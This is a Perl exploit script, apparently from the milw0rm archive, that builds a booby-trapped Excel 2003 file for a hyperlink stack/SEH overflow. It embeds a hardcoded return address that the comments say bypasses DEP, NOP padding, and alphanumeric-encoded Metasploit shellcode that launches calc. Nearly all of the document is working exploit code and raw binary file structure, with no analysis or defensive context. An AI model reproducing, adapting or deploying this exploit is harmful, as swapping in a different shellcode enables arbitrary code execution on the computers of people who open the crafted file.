#!perl
#
# "Microsoft Office Excel 2003" Hlink Stack/SEH Overflow Exploit
#
# Author:  Manuel Santamarina Suarez
#
#
# The vulnerability was discovered by 'kcope'. First click
# on the link and then on the "Yes" button to cause the stack
# overflow.
#


#
# fixed shellcode location !! Must be free of Unicode null terminators (0x0000) !!
#
$sc_addr = reverse( "\x30\x87\xAC\x80" );  # excel.3087ac80 (read/write/EXECUTABLE .data section)
                                          # bypasses hardware and software side DEP
                                          # universal on Office Excel 2003 (German; 11.8012.6568; SP2)

#
# filename
#
$filename = 'exploit.xls';

#
# shellcode !! Must be free of Unicode null terminators (0x0000) !!
#
# win32_exec -  EXITFUNC=process CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
#
$sc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
     "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
     "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
     "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
     "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34".
     "\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47".
     "\x45\x30\x4a\x37\x41\x30\x4f\x4e\x4b\x38\x4f\x34\x4a\x51\x4b\x48".
     "\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58".
     "\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c".
     "\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e".
     "\x46\x4f\x4b\x43\x46\x45\x46\x42\x46\x50\x45\x37\x45\x4e\x4b\x38".
     "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x30\x4b\x54".
     "\x4b\x38\x4f\x35\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x41\x4b\x48".
     "\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x50\x43\x4c\x41\x53".
     "\x42\x4c\x46\x36\x4b\x58\x42\x54\x42\x53\x45\x48\x42\x4c\x4a\x37".
     "\x4e\x30\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x57\x4e\x51\x4d\x4a".
     "\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b".
     "\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x35\x41\x53".
     "\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37".
     "\x42\x35\x4a\x36\x50\x47\x4a\x4d\x44\x4e\x43\x47\x4a\x36\x4a\x49".
     "\x50\x4f\x4c\x48\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46".
     "\x4e\x46\x43\x46\x42\x30\x5a";

###                        ###
### DON'T EDIT AFTER HERE! ###
###                        ###


$sc_len = 5608;

$header = "\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x09\x00".
         "\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00".
         "\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xfe\xff\xff\xff".
         "\x00\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\x2f\x00\x00\x00".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\x09\x08\x10\x00\x00\x06\x05\x00\xbb\x0d\xcc\x07\x41\x00\x00\x00".
         "\x06\x00\x00\x00\x42\x00\x02\x00\xe4\x04\x8d\x00\x02\x00\x00\x00".
         "\x3d\x00\x12\x00\x00\x00\x00\x00\x5c\x35\xed\x30\x38\x00\x00\x00".
         "\x00\x00\x01\x00\x58\x02\x22\x00\x02\x00\x00\x00\x31\x00\x15\x00".
         "\xc8\x00\x00\x00\xff\x7f\x90\x01\x00\x00\x00\x00\x00\x00\x05\x00".
         "\x41\x72\x69\x61\x6c\x31\x00\x15\x00\xc8\x00\x00\x00\xff\x7f\x90".
         "\x01\x00\x00\x00\x00\x00\x00\x05\x00\x41\x72\x69\x61\x6c\x31\x00".
         "\x15\x00\xc8\x00\x00\x00\xff\x7f\x90\x01\x00\x00\x00\x00\x00\x00".
         "\x05\x00\x41\x72\x69\x61\x6c\x31\x00\x15\x00\xc8\x00\x00\x00\xff".
         "\x7f\x90\x01\x00\x00\x00\x00\x00\x00\x05\x00\x41\x72\x69\x61\x6c".
         "\x31\x00\x16\x00\xa0\x00\x00\x00\xff\x7f\x90\x01\x00\x00\x00\x00".
         "\x00\x00\x06\x00\x54\x61\x68\x6f\x6d\x61\x31\x00\x15\x00\xc8\x00".
         "\x00\x00\x0c\x00\x90\x01\x00\x00\x01\x00\x00\x00\x05\x00\x41\x72".
         "\x69\x61\x6c\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\xf5\xff\x20\x00\x00\xf4\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x00\x00\xf5\xff\x20\x00\x00".
         "\xf4\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x00\x00\x01\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x2b\x00\xf5\xff\x20\x00\x00".
         "\xf8\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x29\x00\xf5\xff\x20\x00\x00\xf8\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x2c\x00\xf5\xff\x20\x00\x00".
         "\xf8\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x00".
         "\x00\x2a\x00\xf5\xff\x20\x00\x00\xf8\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\xe0\x00\x14\x00\x00\x00\x09\x00\xf5\xff\x20\x00\x00".
         "\xf8\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x20\xe0\x00\x14\x00\x06".
         "\x00\x00\x00\x01\x00\x20\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00".
         "\x00\xc0\x20\x93\x02\x04\x00\x10\x80\x03\xff\x93\x02\x04\x00\x11".
         "\x80\x06\xff\x93\x02\x04\x00\x12\x80\x04\xff\x93\x02\x04\x00\x13".
         "\x80\x07\xff\x93\x02\x04\x00\x00\x80\x00\xff\x93\x02\x04\x00\x14".
         "\x80\x05\xff\x92\x00\xe2\x00\x38\x00\x00\x00\x00\x00\xff\xff\xff".
         "\x00\xff\x00\x00\x00\x00\xff\x00\x00\x00\x00\xff\x00\xff\xff\x00".
         "\x00\xff\x00\xff\x00\x00\xff\xff\x00\x80\x00\x00\x00\x00\x80\x00".
         "\x00\x00\x00\x80\x00\x80\x80\x00\x00\x80\x00\x80\x00\x00\x80\x80".
         "\x00\xc0\xc0\xc0\x00\x80\x80\x80\x00\x99\x99\xff\x00\x99\x33\x66".
         "\x00\xff\xff\xcc\x00\xcc\xff\xff\x00\x66\x00\x66\x00\xff\x80\x80".
         "\x00\x00\x66\xcc\x00\xcc\xcc\xff\x00\x00\x00\x80\x00\xff\x00\xff".
         "\x00\xff\xff\x00\x00\x00\xff\xff\x00\x80\x00\x80\x00\x80\x00\x00".
         "\x00\x00\x80\x80\x00\x00\x00\xff\x00\x00\xcc\xff\x00\xcc\xff\xff".
         "\x00\xcc\xff\xcc\x00\xff\xff\x99\x00\x99\xcc\xff\x00\xff\x99\xcc".
         "\x00\xcc\x99\xff\x00\xff\xcc\x99\x00\x33\x66\xff\x00\x33\xcc\xcc".
         "\x00\x99\xcc\x00\x00\xff\xcc\x00\x00\xff\x99\x00\x00\xff\x66\x00".
         "\x00\x66\x66\x99\x00\x96\x96\x96\x00\x00\x33\x66\x00\x33\x99\x66".
         "\x00\x00\x33\x00\x00\x33\x33\x00\x00\x99\x33\x00\x00\x99\x33\x66".
         "\x00\x33\x33\x99\x00\x33\x33\x33\x00\x85\x00\x0e\x00\x22\x04\x00".
         "\x00\x00\x00\x06\x00\x53\x68\x65\x65\x74\x31\xfc\x00\x0f\x00\x01".
         "\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x4c\x49\x4e\x4b\x0a\x00".
         "\x00\x00\x09\x08\x10\x00\x00\x06\x10\x00\xbb\x0d\xcc\x07\x41\x00".
         "\x00\x00\x06\x00\x00\x00\x2a\x00\x02\x00\x00\x00\x2b\x00\x02\x00".
         "\x01\x00\x82\x00\x02\x00\x00\x00\x80\x00\x08\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x25\x02\x04\x00\x00\x00\xff\x00\x81\x00\x02\x00".
         "\xc1\x04\x14\x00\x03\x00\x00\x00\x00\x15\x00\x03\x00\x00\x00\x00".
         "\x83\x00\x02\x00\x00\x00\x84\x00\x02\x00\x00\x00\x26\x00\x08\x00".
         "\x00\x00\x00\x00\x00\x00\xe8\x3f\x27\x00\x08\x00\x00\x00\x00\x00".
         "\x00\x00\xe8\x3f\x28\x00\x08\x00\x00\x00\x00\x00\x00\x00\xf0\x3f".
         "\x29\x00\x08\x00\x00\x00\x00\x00\x00\x00\xf0\x3f\xa1\x00\x22\x00".
         "\x00\x00\x64\x00\x01\x00\x00\x00\x00\x00\x02\x00\x58\x02\x58\x02".
         "\x00\x00\x00\x00\x00\x00\xe0\x3f\x00\x00\x00\x00\x00\x00\xe0\x3f".
         "\x01\x00\x55\x00\x02\x00\x08\x00\x00\x02\x0e\x00\x00\x00\x00\x00".
         "\x01\x00\x00\x00\x00\x00\x01\x00\x00\x00\xfd\x00\x0a\x00\x00\x00".
         "\x00\x00\x15\x00\x00\x00\x00\x00\xb8\x01\x1c\x20\x00\x00\x00\x00".
         "\x00\x00\x00\x00\xd0\xc9\xea\x79\xf9\xba\xce\x11\x8c\x82\x00\xaa".
         "\x00\x4b\xa9\x0b\x02\x00\x00\x00\x03\x00\x00\x00\xe0\xc9\xea\x79".
         "\xf9\xba\xce\x11\x8c\x82\x00\xaa\x00\x4b\xa9\x0b\xf2\x55\x00\x00";

$body1   = "\x3c\x00\x20\x20";

$body2   = "\x3c\x00\xea\x15";

$footer = "\x00\x00\x3e\x02\x12\x00\xb6\x06\x00\x00\x00\x00\x40\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x0f\x00\x03\x00\x00\x00".
         "\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x0a\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x52\x00\x6f\x00\x6f\x00\x74\x00".
         "\x20\x00\x45\x00\x6e\x00\x74\x00\x72\x00\x79\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00\x05\x00\xff\xff\xff\xff".
         "\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x57\x00\x6f\x00\x72\x00\x6b\x00".
         "\x62\x00\x6f\x00\x6f\x00\x6b\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x12\x00\x02\x00\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x57\x5b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
         "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00".
         "\x03\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x06\x00\x00\x00".
         "\x07\x00\x00\x00\x08\x00\x00\x00\x09\x00\x00\x00\x0a\x00\x00\x00".
         "\x0b\x00\x00\x00\x0c\x00\x00\x00\x0d\x00\x00\x00\x0e\x00\x00\x00".
         "\x0f\x00\x00\x00\x10\x00\x00\x00\x11\x00\x00\x00\x12\x00\x00\x00".
         "\x13\x00\x00\x00\x14\x00\x00\x00\x15\x00\x00\x00\x16\x00\x00\x00".
         "\x17\x00\x00\x00\x18\x00\x00\x00\x19\x00\x00\x00\x1a\x00\x00\x00".
         "\x1b\x00\x00\x00\x1c\x00\x00\x00\x1d\x00\x00\x00\x1e\x00\x00\x00".
         "\x1f\x00\x00\x00\x20\x00\x00\x00\x21\x00\x00\x00\x22\x00\x00\x00".
         "\x23\x00\x00\x00\x24\x00\x00\x00\x25\x00\x00\x00\x26\x00\x00\x00".
         "\x27\x00\x00\x00\x28\x00\x00\x00\x29\x00\x00\x00\x2a\x00\x00\x00".
         "\x2b\x00\x00\x00\x2c\x00\x00\x00\x2d\x00\x00\x00\xfe\xff\xff\xff".
         "\xfe\xff\xff\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff".
         "\xff\xff\xff\xff\xff\xff\xff\xff";


print '"Microsoft Office Excel 2003" Hlink Stack/SEH Overflow Exploit'."\n\n";

if( length( $sc ) > $sc_len )
{

   print "[-] Error: Shellcode size exceeds $sc_len bytes!";
   exit( 1 );

}

print "[+] Creating file...\n";
open ( FILE, ">$filename" ) || die "[-] $!";
binmode ( FILE );

print "[+] Writing exploit into the file...\n";
$fill_cnt = $sc_len - length( $sc );

for ( $i = 1; $i <= $fill_cnt; $i++ )
{

   $sc = "\x90$sc";

}

print FILE $header . $sc_addr x 2042 . $body1 . 'Fill' x 2056 . "$body2$sc$footer";
close ( FILE );

print "[+] Exploit file has been successfully built.";

# milw0rm.com [2006-06-27]